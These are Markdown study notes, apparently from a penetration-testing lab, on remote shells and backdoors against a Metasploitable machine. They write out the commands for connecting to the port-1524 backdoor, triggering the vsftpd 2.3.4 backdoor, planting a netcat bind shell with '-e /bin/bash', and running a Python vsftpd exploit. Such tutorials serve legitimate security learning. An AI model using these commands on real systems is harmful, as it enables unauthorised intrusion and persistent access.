# Exploitation and Backdoor

## What is a Remote Shell?
A **remote shell** allows you to execute commands on another machine as if you were sitting in front of it.  
It’s a session that provides remote access and control over a system through a terminal connection.

Example:
ssh user@192.168.100.3

After connection:
user@metasploitable → Logged in with privilege of 'user' only.

To check what privileges this user has:
sudo -l

This command lists all the commands that the current user can execute with administrative privileges.

---

## What is a Backdoor?
A **backdoor** is a hidden method of accessing a system or network, bypassing normal authentication mechanisms.  
It allows remote access to a system even after the main vulnerability has been fixed.

Example:
nc 192.168.100.3 1524  
→ This opens a connection to a system that already has a backdoor listening on port **1524**.

It’s known as “the easiest hack in the world” because connecting to this port gives immediate shell access.

---

## Exploiting a Backdoored FTP
Many vulnerable systems (like older versions of **vsftpd**) contain built-in backdoors.

Example:
ftp 192.168.100.3  
Username: anyone:)

Using this specific username pattern triggers the hidden backdoor inside **vsftpd 2.3.4**.  
Once triggered, the attacker can connect using **Netcat** to gain a remote shell.

nc 192.168.100.3 6200

You now have a **shell session** directly on the target system through the backdoor FTP vulnerability.

---

## Creating Your Own Backdoor
A simple backdoor can be created using **Netcat (nc)** by setting up a listener on a specific port and attaching a shell to it.

### Bindshell
A **bind shell** opens a port on the target machine and waits for incoming connections. When a connection is made, it provides shell access.

On Target (Victim):
nc -lp 1234 -e /bin/bash  
(-l: listen, -p: port, -e: execute command)

This command:
1. Opens port **1234** on the target system.  
2. Attaches **/bin/bash** to it (Linux shell).  
3. Waits for a remote connection.

On Attacker (Kali):
nc 192.168.100.3 1234

This connects to the open port and provides a **remote shell session**.

---

## How the Backdoor FTP Exploit Works
The **vsftpd 2.3.4** service has a built-in malicious backdoor triggered by a specific username pattern.

### Exploitation Steps:
1. Download or use a Python exploit for vsftpd 2.3.4 vulnerability.  
   Example exploit command:
   python3 vsftpd_234_exploit.py <target_ip> 21 "nc -lp 1234 -e /bin/bash"

   - `<target_ip>`: Target machine IP (e.g., 192.168.100.3)  
   - `21`: FTP port  
   - The exploit runs a command that attaches `/bin/bash` to port **1234**

2. Open another terminal and start listening on port 1234:
   nc <target_ip> 1234

3. Once the exploit runs successfully, a **remote shell** is established.

---

## RCE to Shell — The General Exploitation Flow
A common attack path for remote exploitation and shell access is as follows:

1. **Find a vulnerability** that allows Remote Code Execution (RCE).  
2. **Locate or create an exploit** script (often Python-based) that triggers the RCE.  
3. **Use the exploit** to execute system commands remotely.  
4. **Leverage Netcat** to attach `/bin/bash` (Linux shell) to an open port (e.g., 1234).  
5. **Connect** from your attacking machine to the opened port using Netcat.  
6. **Get a shell!**

---

## Summary

| Concept | Description | Example Command |
|----------|--------------|----------------|
| Remote Shell | Access target system remotely using SSH | ssh user@192.168.100.1 |
| Privilege Check | Check what admin rights user has | sudo -l |
| Backdoor Connection | Connect to a backdoored port | nc 192.168.100.3 1524 |
| Trigger Backdoor (FTP) | Exploit backdoored vsftpd | ftp 192.168.100.3 → Username: anyone:) |
| Access Shell (FTP Backdoor) | Connect to opened port | nc 192.168.100.3 6200 |
| Create Bind Shell | Set up a custom backdoor | nc -lp 1234 -e /bin/bash |
| Connect to Bind Shell | Gain shell access | nc 192.168.100.3 1234 |
| Exploit via Python | Run exploit and attach shell | python3 vsftpd_234_exploit.py <ip> 21 "nc -lp 1234 -e /bin/bash" |
| Connect to Exploit Shell | Establish RCE session | nc <ip> 1234 |

---

**In short:**  
Remote shells and backdoors are fundamental in exploitation.  
Attackers use vulnerabilities (like vsftpd 2.3.4) or create their own backdoors using Netcat to gain persistent access.  
Always secure systems by updating vulnerable services, closing unused ports, and monitoring network connections.
